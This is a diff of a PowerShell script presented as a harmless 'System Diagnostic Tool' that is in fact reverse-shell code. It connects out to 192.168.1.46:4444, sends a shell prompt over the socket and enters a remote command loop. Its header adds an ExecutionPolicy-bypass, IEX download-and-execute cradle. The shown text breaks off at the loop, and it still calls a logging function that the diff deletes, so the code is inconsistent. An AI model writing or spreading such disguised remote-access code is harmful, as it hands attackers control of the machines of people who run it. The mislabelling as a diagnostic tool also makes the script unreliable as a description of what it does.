@@ -1,51 +1,47 @@
-# System Diagnostic Tool v3.0 - PowerShell Edition
-# Educational network diagnostic utility for authorized testing only
-# This script demonstrates advanced network communication and system analysis
+# Simple System Diagnostic - PowerShell Edition
+# Run with: powershell -ExecutionPolicy Bypass -Command "& { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('file:///$PWD/Invoke-SystemDiagnostic.ps1') }"
+# Or directly: powershell -ExecutionPolicy Bypass -File .\Invoke-SystemDiagnostic.ps1
 
-param(
-    [string]$ServerHost = "192.168.1.46",
-    [int]$ServerPort = 4444
-)
+# Configuration
+$ServerHost = "192.168.1.46"
+$ServerPort = 4444
 
-function Write-DiagnosticLog {
-    param([string]$Message)
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $Message" -ForegroundColor Green
-}
+# Generate session ID
+$SessionId = -join ((1..8) | ForEach {[char]((65..90) + (97..122) + (48..57) | Get-Random)})
 
-function Invoke-NetworkDiagnostic {
-    param(
-        [string]$TargetHost,
-        [int]$TargetPort
-    )
+Write-Host "=" * 60 -ForegroundColor Cyan
+Write-Host "System Diagnostic Tool v3.0 - PowerShell Edition" -ForegroundColor Cyan
+Write-Host "Session ID: $SessionId" -ForegroundColor Cyan
+Write-Host "Educational network diagnostic utility" -ForegroundColor Cyan
+Write-Host "=" * 60 -ForegroundColor Cyan
+
+Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Initializing network diagnostic..." -ForegroundColor Green
+Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Target: $ServerHost`:$ServerPort" -ForegroundColor Green
+
+try {
+    # Create TCP connection
+    $client = New-Object System.Net.Sockets.TcpClient
+    $client.Connect($ServerHost, $ServerPort)
     
-    Write-DiagnosticLog "System Diagnostic Tool v3.0 - PowerShell Edition"
-    Write-DiagnosticLog "Initializing network connectivity diagnostic..."
-    Write-DiagnosticLog "Target: $TargetHost:$TargetPort"
-    
-    try {
-        # Create TCP client for network diagnostic
-        $client = New-Object System.Net.Sockets.TcpClient
-        $client.Connect($TargetHost, $TargetPort)
+    if ($client.Connected) {
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connection established!" -ForegroundColor Green
         
-        if ($client.Connected) {
-            Write-DiagnosticLog "Network diagnostic connection established successfully"
-            
-            # Get network stream for diagnostic communication
-            $stream = $client.GetStream()
-            $writer = New-Object System.IO.StreamWriter($stream)
-            $reader = New-Object System.IO.StreamReader($stream)
-            $writer.AutoFlush = $true
-            
-            # Send diagnostic initialization messages
-            $writer.WriteLine("System Diagnostic Tool v3.0 - PowerShell Edition")
-            $writer.WriteLine("Network connectivity test completed successfully")
-            $writer.WriteLine("Ready for system analysis and diagnostic commands")
-            $writer.WriteLine("")
-            
-            # Initialize current working directory for diagnostics
-            $currentDir = Get-Location
-            $writer.WriteLine("Diagnostic base directory: $currentDir")
-            $writer.Write("$currentDir> ")
+        # Setup stream communication
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer.AutoFlush = $true
+        
+        # Send initial messages
+        $writer.WriteLine("System Diagnostic Tool v3.0 - PowerShell Edition")
+        $writer.WriteLine("Network connectivity test completed")
+        $writer.WriteLine("Ready for diagnostic commands")
+        $writer.WriteLine("")
+        
+        # Get current directory
+        $currentDir = Get-Location
+        $writer.WriteLine("Base directory: $currentDir")
+        $writer.Write("$currentDir> ")
             
             Write-DiagnosticLog "Entering diagnostic command loop..."
             
